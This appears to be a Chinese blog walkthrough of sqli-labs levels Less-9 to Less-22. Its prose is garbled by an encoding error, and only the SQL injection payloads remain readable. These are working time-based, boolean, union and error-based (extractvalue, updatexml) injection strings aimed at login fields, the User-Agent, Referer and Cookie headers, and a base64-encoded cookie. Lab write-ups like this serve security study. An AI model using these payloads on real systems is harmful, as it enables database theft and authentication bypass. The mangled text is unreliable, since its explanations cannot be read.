ä½œä¸ºä¸€ä¸ªè¯­å¥åŠ æ‹¬å·ç”¨è„šæœ¬æ¥è·‘ æ›´æ–°äº2019-03-04 23:09:10 æ˜ŸæœŸä¸€ Less-9ç›²æ³¨åŸºäºæ—¶é—´if( expr1 , expr2 , expr3 ) expr1 true è¿”å›expr2 false è¿”å› expr3 ?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+ åˆ©ç”¨é¡µé¢è¿”å›æ—¶é—´åˆ¤æ–­å¯¹é”™ä¾‹å¦‚?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+ Less-10ä¸ä¸Šé¢˜ç›¸åŒï¼Œä¸è¿‡åˆ©ç”¨&quot;è¿›è¡Œé—­åˆ æ›´æ–°äº2019-03-06 20:29:31 æ˜ŸæœŸä¸‰ Less-11GET - ä»æŒ‡å®šçš„èµ„æºè¯·æ±‚æ•°æ®ã€‚ POST - å‘æŒ‡å®šçš„èµ„æºæäº¤è¦è¢«å¤„ç†çš„æ•°æ® è¾“å…¥&#39;æŠ¥é”™ï¼ŒçŸ¥ç”¨&#39;é—­åˆuname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; or &#39;1&#39;=&#39;1&amp;submit=Submitå¯ä»¥ç›´æ¥çˆ†å‡ºæ¥å…¶ä»–ç›¸åŒuname=&#39; or &#39;1&#39;=&#39;1&amp;passwd=&#39; union select 1,2#&amp;submit=Submit Less-12å®éªŒå¯çŸ¥ç”¨&quot;)é—­åˆå…¶ä»–ç›¸åŒ Less-13å®éªŒçŸ¥ç”¨&#39;) é—­åˆå…¶ä»–ç›¸åŒï¼Œä¾‹å¦‚ uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(database()))) #&amp;submit=Submit uname=1&amp;passwd=1&#39;) and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))) #&amp;submit=Submit Less-14å®éªŒçŸ¥ç”¨&quot;é—­åˆå…¶ä»–å’Œä¸Šé¢˜ç›¸åŒ Less-15å®éªŒçŸ¥ç”¨&#39;é—­åˆä½†æ²¡ç”¨æŠ¥é”™ä¿¡æ¯æ‰€ä»¥ä½¿ç”¨æ—¶é—´æˆ–å¸ƒå°”æ³¨å…¥uname=&#39; or if(ascii(substr(database(),1,1))=115,sleep(0.5),1) #&amp;passwd=1&amp;submit=Submit Less-16å®éªŒçŸ¥ç”¨&quot;é—­åˆå…¶ä»–å’Œä¸Šé¢˜ç›¸åŒ Less-17åœ¨unameä¸­æ³¨å…¥ï¼Œéƒ½æ²¡æœ‰ååº”åœ¨passwordä¸­æ³¨å…¥ï¼Œä¹Ÿæ²¡æœ‰ååº”åçŸ¥å…ˆéªŒè¯ç”¨æˆ·åæ­£ç¡®åï¼Œæ‰æ‰§è¡Œpassword updatexml()uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,version(),0x7e),1)# &amp;submit=Submit uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)# &amp;submit=Submit å…¶ä»–ç›¸åŒ Less-18ä½¿ç”¨æ­£ç¡®è´¦å·å¯†ç åï¼Œé¡µé¢æ˜¾ç¤ºuser-agentï¼Œåˆ™å¯ä»¥åœ¨è¿™ä¸Šé¢æ³¨å…¥ 1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) and &#39;1&#39;=&#39;11&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e)) and &#39;1&#39;=&#39;1å…¶ä»–ç›¸åŒHTTP è¯·æ±‚å¤´ä¸­é™¤äº† User-Agentå¯èƒ½å­˜åœ¨sqlæ³¨å…¥æ„å¤–ï¼Œè¿˜æœ‰refererã€X-Forwarded-Forå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚ æ›´æ–°äº2019-03-10 22:43:03 æ˜ŸæœŸæ—¥ Less-19å‚è€ƒä¸Šé¢˜è¾“å…¥æ­£ç¡®ç”¨æˆ·å’Œå¯†ç åï¼Œè·³å‡ºé¡µé¢ å·®ä¸å¤šçŸ¥é“åœ¨refererä¸Šæ³¨å…¥&#39; and (extractvalue(1,concat(0x7e,(select version()),0x7e)) ) and &#39;1&#39;=&#39;1ä¸èƒ½ç”¨#æ³¨é‡Šï¼Œå› ä¸ºåé¢è¿˜æœ‰è¯­å¥å­˜åœ¨ &#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1),0x7e)) ) and &#39;1&#39;=&#39;1 æ›´æ–°äº2019-03-10 22:43:03 æ˜ŸæœŸæ—¥ Less-20ç”±é¢˜ç›®çŸ¥æ³¨å…¥ç‚¹åœ¨Cookieä¸­ è¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯ï¼Œç”±äºæ²¡æœ‰æ‹¦æˆªï¼Œä¿®æ”¹Cookieåï¼Œç›´æ¥ç‚¹åˆ·æ–°ä¸ä¼šå‡ºç»“æœï¼Œéœ€è¦é‡æ–°è½½å…¥é¡µé¢ è¾“å…¥&#39;æŠ¥é”™å­˜åœ¨æ³¨å…¥ç‚¹ æ¥ä¸‹æ¥å¯ä»¥ç”¨ç¬¬ä¸€é¢˜ç”¨çš„&#39; union select 1,2,database()# &#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema =database()# ä¹Ÿå¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))# Less-21æŸ¥çœ‹CookieYWRtaW4è¿›è¡Œè§£å¯†ï¼ŒçŸ¥æ˜¯ç”¨base64åŠ å¯†çš„adminæ‰€ä»¥åªè¦å°†ä¸Šé¢˜å†…å®¹åŠ å¯†å³å¯ Less-22æŸ¥çœ‹cookieadmin&#39; and 1=1 #æ²¡æœ‰æŸ¥è¯¢ç»“æœadmin&quot; and 1=1 #ç»“æœæ­£ç¡®çŸ¥æ˜¯ç”¨&quot;é—­åˆå…¶ä»–æ–¹æ³•ä¸å‰é¢˜ç›¸åŒ æ›´æ–°äº2019-03-13 20:26:48 æ˜ŸæœŸä¸‰","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"http://finsenty54.github.io/tags/sql/"}]}]}